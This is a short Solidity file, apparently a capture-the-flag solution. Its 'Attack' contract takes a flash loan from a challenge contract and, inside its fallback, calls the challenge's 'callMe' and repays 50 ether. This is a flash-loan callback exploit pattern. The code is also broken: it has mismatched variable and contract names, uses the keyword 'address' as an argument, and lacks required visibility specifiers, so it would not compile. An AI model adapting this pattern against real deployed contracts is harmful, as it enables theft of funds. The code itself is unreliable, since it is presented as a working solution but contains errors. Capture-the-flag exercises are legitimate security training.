pragma solidity ^0.8.17;

import "./challengeOne.sol";
import "./challengeTwo.sol";
import "./challengeThree.sol";

contract Attack {

	ChallengeTwo _chal;

	constructor (address _address) {
		_chall = challengeTwo(address);
	}

	function solve() {
		_chall.flashloan(50e18);
	}

	// this function will be called when money is sent to this contract
	fallback() payable {
		_chall.callMe();
		payable(address(_chall)).call{value:50 ether}("");
	}
}
